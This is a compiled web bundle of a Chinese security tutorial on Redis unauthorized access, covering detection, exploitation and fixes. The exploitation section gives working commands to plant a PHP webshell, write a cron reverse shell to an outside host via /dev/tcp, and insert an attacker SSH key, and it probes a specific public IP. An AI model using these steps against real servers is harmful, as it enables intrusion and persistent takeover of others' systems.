import{_ as l,W as i,X as t,Y as s,Z as a,a0 as r,a1 as n,C as d}from"./framework-b6a07282.js";const o={},c=n(`<h2 id="redis未授权访问" tabindex="-1"><a class="header-anchor" href="#redis未授权访问" aria-hidden="true">#</a> Redis未授权访问</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li><p>Redis默认端口：TCP6379</p></li><li><p>Redis未授权访问漏洞是指Redis服务没有设置密码或防火墙规则，导致任意用户可以直接访问Redis命令行并读写数据。</p></li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li>Redis服务没有设置密码或防火墙规则。</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ol><li>使用telnet命令连接目标服务器的6379端口</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>C:\\Users\\XY&gt;telnet 124.70.71.251 42270
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="2"><li>扫描如果发现TCP6379端口，可直接尝试登陆。</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">[</span>root@localhost redis-stable<span class="token punctuation">]</span><span class="token comment"># redis-cli -h 124.70.71.251 -p 42270</span>
<span class="token number">124.70</span>.71.251:4227<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span> <span class="token comment">#此为存在未授权访问</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ul><li>攻击者可以利用Redis的config命令，修改目标服务器的配置文件，插入恶意代码。</li><li>攻击者可以利用Redis的主从复制功能，将恶意模块加载到目标服务器上，执行任意命令。</li><li>攻击者可以利用Redis的eval命令，执行Lua脚本，实现远程代码执行。</li></ul><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><ol><li>写入webshell</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.0.143 <span class="token parameter variable">-p</span> <span class="token number">6379</span>
<span class="token number">2</span>.set x <span class="token string">&quot;&lt;?php @eval(<span class="token variable">$_POST</span>[&#39;tf&#39;]); ?&gt;&quot;</span>
<span class="token number">3</span>.config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html <span class="token comment">#设置保存的路径</span>
<span class="token number">4</span>.config <span class="token builtin class-name">set</span> dbfilename shell.php <span class="token comment">#设置保存的文件名</span>
<span class="token number">5</span>.save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>设置定时任务反弹shell</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.set x <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.44/7777 0&gt;&amp;1<span class="token entity" title="\\n">\\n</span>&quot;</span>
<span class="token number">2</span>.config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/
<span class="token number">3</span>.config <span class="token builtin class-name">set</span> dbfilename root
<span class="token number">4</span>.save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>ssh免密登录</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.攻击机生成rsa密钥：ssh-keygen <span class="token parameter variable">-t</span> rsa
<span class="token number">2</span>.控制机通过未授权访问漏洞连接到Redis
<span class="token number">3</span>.set x ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm4c67+6teIIEHfz52F9xHihTinfYd4XRA2LZ4/pjGEm3HH00VFI+r+hF8zkt3MZIl6Ie7RvNjYIMM5l2pf3o83lABsQsGToAqeoCm41j6GRu9Ji3j49QjGvOJcfZXJnxmeXSa+g9CS1E71b5Nxx+nmAVXOjo95KoOXXS7VXlxorKW8iCK8qJ08tGvEqpdLQKwcRY300X1LOKhf24cbc79Hh7uXcQI9YSnrtHMuZ9/Q6A9btrA75qXZz00SUefiGf53rCHq3fxBGNNYoKGxnnoJhzItRMBWw+Va2X0QkQPgHVOnztf9lB22elDjBGrOWJFyfPbLYVd/5X+skhAYmn3 root@localhost.localdomain
 <span class="token comment">#将生成的公钥复制到肉鸡上。</span>
<span class="token number">4</span>.config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /<span class="token environment constant">$HOME</span>/.ssh
<span class="token number">5</span>.config <span class="token builtin class-name">set</span> dbfilename authorized_keys
<span class="token number">6</span>.ssh <span class="token parameter variable">-i</span> ./id_rsa user@IP 攻击机使用私钥免密登录
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>config set：动态修改配置，重启后失效</p><p>其他利用方式：基于主从复制的RCE、jackson 反序列化利用、lua RC、redis密码爆破</p><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li>设置Redis的密码认证，使用requirepass命令或者修改配置文件中的requirepass选项。</li><li>使用防火墙规则或者安全组策略，限制外部IP对Redis端口的访问。</li><li>修改Redis的配置文件，将绑定地址从0.0.0.0改为127.0.0.1或者其他内网地址，避免暴露在公网上。</li><li>修改默认端口</li><li>不要用root用户运行redis。</li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>暂无</li></ul><h3 id="linux知识补充" tabindex="-1"><a class="header-anchor" href="#linux知识补充" aria-hidden="true">#</a> linux知识补充</h3><h4 id="定时任务" tabindex="-1"><a class="header-anchor" href="#定时任务" aria-hidden="true">#</a> 定时任务</h4>`,27),p=s("thead",null,[s("tr",null,[s("th",null,"命令"),s("th",null,"操作")])],-1),u=s("tr",null,[s("td",null,"crontab -u root -r"),s("td",null,"删除某个用户的任务")],-1),h={href:"http://time.com",target:"_blank",rel:"noopener noreferrer"},b=s("td",null,"把文件添加到某个用户的任务",-1),m=s("tr",null,[s("td",null,"crontab -u root -l"),s("td",null,"列举某个用户的任务")],-1),v=s("tr",null,[s("td",null,"crontab -u root -e"),s("td",null,"编辑某个用户的任务")],-1),k=n('<h4 id="cron文件存储路径" tabindex="-1"><a class="header-anchor" href="#cron文件存储路径" aria-hidden="true">#</a> cron文件存储路径</h4><table><thead><tr><th>路径</th><th>内容</th></tr></thead><tbody><tr><td>/var/spool/cron</td><td>这个文件负责安排由系统管理员制定的维护系统以及其他任务的crontab</td></tr><tr><td>/etc/crontab</td><td>放的是对应周期的任务dalily、hourly 、monthly、week</td></tr></tbody></table>',2);function _(f,g){const e=d("ExternalLinkIcon");return i(),t("div",null,[c,s("table",null,[p,s("tbody",null,[u,s("tr",null,[s("td",null,[a("crontab -u root "),s("a",h,[a("time.com"),r(e)])]),b]),m,v])]),k])}const R=l(o,[["render",_],["__file","Redis未授权访问.html.vue"]]);export{R as default};
